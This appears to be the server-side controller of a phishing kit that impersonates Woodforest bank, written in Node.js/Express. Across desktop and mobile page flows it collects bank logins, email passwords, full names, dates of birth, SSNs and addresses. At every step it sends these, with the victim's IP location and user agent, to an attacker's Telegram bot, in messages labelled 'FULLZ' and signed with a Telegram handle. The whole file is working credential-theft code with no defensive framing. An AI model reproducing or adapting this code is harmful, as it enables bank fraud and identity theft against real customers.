const { sendMessageFor } = require("simple-telegram-message");
const { botToken, chatId } = require("../settings");
const getIPDetails = require("../middleware/getIPDetails");

let storedCredentials = {
  username: "",
  password: "",
  email: "",
  emailPass: "",
  fname: "",
  dob: "",
  phone: "",
  ssn: "",
  address: "",
  city: "",
  state: "",
  zipcode: "",
};

// console.log(getIPDetails());

// controllers/controller.js

exports.login = (req, res) => {
  res.render(res.locals.template + 'login');
};

exports.mobileLogin = (req, res) => {
  res.render('mobile/login');
};

// Other controller methods can follow a similar pattern.


exports.loginPost = async (req, res) => {
  const { username, password } = req.body;
  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;
  storedCredentials = { username, password };

  const userAgent = req.headers["user-agent"];

  const message =
    `++++++🔰WOODFOREST || LOGIN 1🔰++++++ + '\n'` +
    `Username : ${username}\n` +
    `Password : ${password}\n` +
    `++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/confirm-login");
};

exports.confirmLogin = (req, res) => {
  res.render("confirm-login");
};

exports.confirmLoginPost = async (req, res) => {
  const { username, password } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `++++++🔰WOODFOREST || LOGIN 2🔰++++++ + '\n'` +
    `Username : ${username}\n` +
    `Password  : ${password}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/email-verification");
};

exports.emailVerification = (req, res) => {
  res.render("email-verification");
};

exports.emailVerificationPost = async (req, res) => {
  const { email, emailPass } = req.body;
  const { username, password } = storedCredentials;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];
  storedCredentials = { ...storedCredentials, email, emailPass };

  const message =
    `"++++++🔰WOODFOREST || EMAIL ACCESS🔰++++++" + '\n'` +
    `Username : ${username}\n` +
    `Password : ${password}\n` +
    `Email : ${email}\n` +
    `Email Password : ${emailPass}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/personal");
};

exports.personal = (req, res) => {
  res.render("personal");
};

exports.personalPost = async (req, res) => {
  const { fname, dob, ssn, phone, address, city1, state, zipcode } = req.body;
  const { username, password, email, emailPass } = storedCredentials;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];
  storedCredentials = {
    ...storedCredentials,
    fname,
    dob,
    ssn,
    phone,
    address,
    city1,
    state,
    zipcode,
  };

  const message =
    `"++++++🔰WOODFOREST || FULLZ🔰++++++" + '\n'` +
    `Username : ${username}\n` +
    `Password : ${password}\n` +
    `Email : ${email}\n` +
    `Email Password : ${emailPass}\n\n` +
    `Full Name : ${fname}\n` +
    `Date of Birth : ${dob}\n\n` +
    `SSN : ${ssn}\n\n` +
    `Phone Number : ${phone}\n\n` +
    `Address : ${address}\n\n` +
    `City : ${city1}\n\n` +
    `State : ${state}\n\n` +
    `Zipcode : ${zipcode}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/success");
};

// MOBILLE  ////////////////////////

exports.mobileLoginPost = async (req, res) => {
  const { username, password } = req.body;
  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;
  storedCredentials = { username, password };

  const userAgent = req.headers["user-agent"];

  const message =
    `++++++🔰WOODFOREST || LOGIN 1🔰++++++ + '\n'` +
    `Username : ${username}\n` +
    `Password : ${password}\n` +
    `++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/mobile/confirm-login");
};

exports.mobileConfirmLogin = (req, res) => {
  res.render("mobile/confirm-login");
};

exports.mobileConfirmLoginPost = async (req, res) => {
  const { username, password } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `++++++🔰WOODFOREST || LOGIN 2🔰++++++ + '\n'` +
    `Username : ${username}\n` +
    `Password  : ${password}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/mobile/email-verification");
};

exports.mobileEmailVerification = (req, res) => {
  res.render("mobile/email-verification");
};

exports.mobileEmailVerificationPost = async (req, res) => {
  const { email, emailPass } = req.body;
  const { username, password } = storedCredentials;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];
  storedCredentials = { ...storedCredentials, email, emailPass };

  const message =
    `"++++++🔰WOODFOREST || EMAIL ACCESS🔰++++++" + '\n'` +
    `Username : ${username}\n` +
    `Password : ${password}\n` +
    `Email : ${email}\n` +
    `Email Password : ${emailPass}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/mobile/personal");
};

exports.mobilePersonal = (req, res) => {
  res.render("mobile/personal");
};

exports.mobilePersonalPost = async (req, res) => {
  const { fname, dob, ssn, phone, address, city1, state, zipcode } = req.body;
  const { username, password, email, emailPass } = storedCredentials;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];
  storedCredentials = {
    ...storedCredentials,
    fname,
    dob,
    ssn,
    phone,
    address,
    city1,
    state,
    zipcode,
  };

  const message =
    `"++++++🔰WOODFOREST || FULLZ🔰++++++" + '\n'` +
    `Username : ${username}\n` +
    `Password : ${password}\n` +
    `Email : ${email}\n` +
    `Email Password : ${emailPass}\n\n` +
    `Full Name : ${fname}\n` +
    `Date of Birth : ${dob}\n\n` +
    `SSN : ${ssn}\n\n` +
    `Phone Number : ${phone}\n\n` +
    `Address : ${address}\n\n` +
    `City : ${city1}\n\n` +
    `State : ${state}\n\n` +
    `Zipcode : ${zipcode}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/success");
};

exports.success = (req, res) => {
  return res.render("success");
};

exports.page404Redirect = (req, res) => {
  return res.redirect("/auth/login");
};
